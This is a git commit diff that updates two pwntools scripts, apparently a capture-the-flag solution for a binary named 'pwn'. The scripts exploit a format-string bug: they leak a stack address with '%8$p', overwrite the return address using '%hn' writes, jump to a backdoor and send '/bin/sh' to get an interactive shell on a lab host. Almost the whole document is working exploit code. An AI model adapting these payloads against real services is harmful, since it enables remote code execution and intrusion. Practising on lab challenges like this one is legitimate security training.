e67893c480789816e4a93907a91241f8dfae21d6
RamBree <1213053204@qq.com>
2026-01-13 20:18:39 +0800

    fmt_s

--- fmt_s/exp.py
+++ fmt_s/exp.py
@@ -1,29 +1,35 @@
 from pwn import *
 import ctypes    
-context(arch='amd64', os='linux', log_level='debug')                        
+context(arch='amd64', os='linux', log_level='debug')
+context.terminal = ["tmux", "splitw", "-h"]                        
 # context.terminal = ["tmux","splitw","-h"]#产生左右分屏，不带的话是上下分屏比较难受
 # gdb.attach(io)                    # 启动 GDB
-io = remote("127.0.0.1",36803) 
+io = connect("172.24.112.1",10825) 
 # io = process("./pwn")        
 elf = ELF("./pwn")
 libc = ELF("./libc.so.6")
 
 system_addr = 0x40127b
 
-fmt = "%8$p".encode()
-io.sendafter(b'him...',fmt)
+fmt = b"%8$p"
+io.sendlineafter("You start talking to him...",fmt)
 io.recvuntil('0x')
-ret_addr = int(b'0x'+io.recv(12),16)-0x18
-print(hex(ret_addr))
-io.sendafter(b' battle!',b'\x00'*8)
+ret_addr = int(io.recv(12),16)-0x18
+log.debug(hex(ret_addr))
+pause()
+io.sendlineafter("You enraged the monster-prepare for battle!", 'a' * 7)
 
-fmt = "%{}c%12$hn".format(ret_addr & 0xffff).encode()
-io.sendafter(b'him...',fmt)
-io.sendafter(b' battle!',b'\x00'*8)
-
-fmt = "%{}c%32$hn".format(system_addr & 0xffff).encode()
-io.sendafter(b'him...',fmt)
-
-io.sendafter(b' battle!','sh\x00')
+count = ret_addr & 0xffff
+fmt = f"%{count}c%12$hn".format().encode()
+io.sendlineafter("You start talking to him...",fmt)
+pause()
+io.recvuntil("You enraged the monster-prepare for battle!")
+io.sendline('a' * 7)
+pause()
+count = system_addr & 0xffff
+fmt = f"%{count}c%32$hn".format().encode()
+io.sendlineafter("You start talking to him...",fmt)
+pause()
+io.sendlineafter("You enraged the monster-prepare for battle!", '/bin/sh\x00')
 
 io.interactive()
--- fmt_s/test.py
+++ fmt_s/test.py
@@ -1,23 +1,35 @@
 from pwn import *
-context(os='linux',arch='amd64',log_level='debug')
-p = remote("127.0.0.1",36803) 
-elf = ELF('./pwn')
-#gdb.attach(p,'b *0x401337')
-#pause()
-bkd=0x40127b
-def se(ss):
-    p.sendafter(b'...',ss)
-def pas():
-    p.sendafter(b'!',b'\x00'*8)
-se(b'%8$p')
-p.recvuntil(b'0x')
-st=int(b'0x'+p.recv(12),16)-0x18
-log.debug(hex(st))
-pas()
-payload='%{}c%12$hn'.format(st&0xffff).encode()
-se(payload)
-pas()
-payload='%{}c%32$hn'.format(bkd&0xffff).encode()
-se(payload)
-p.sendlineafter(b'!',b'sh\x00')
+from ctypes import *
+context(os='linux', arch='amd64', log_level='debug')
+context.terminal = ["tmux", "splitw", "-h"]
+p = connect("172.24.112.1",10825)
+
+def VIO_TEXT(x, code=95):
+    return f"\x1b[{code}m{x}\x1b[0m"
+
+
+def CLEAR_TEXT(x, code=32):
+    return f"\x1b[{code}m{x}\x1b[0m"
+
+
+system = 0x40127B
+
+payload = b'%8$p'
+p.sendafter("You start talking to him...\n", payload)
+p.recvuntil('0x')
+stack_ret = int(p.recv(12), 16) - 0x18
+log.success(VIO_TEXT("stack_ret: " + hex(stack_ret)))
+p.sendafter("You enraged the monster-prepare for battle!\n", 'a' * 8)
+
+count = stack_ret & 0xffff
+payload2 = f'%{count}c%6$hn'.format().encode()
+p.sendafter("You start talking to him...\n", payload2)
+p.sendafter("You enraged the monster-prepare for battle!\n", 'a' * 8)
+
+count = system & 0xffff
+payload3 = f'%{count}c%47$hn'.format().encode()
+p.sendafter("You start talking to him...\n", payload3)
+p.sendafter("You enraged the monster-prepare for battle!\n", '/bin/sh\x00')
+
 p.interactive()
+
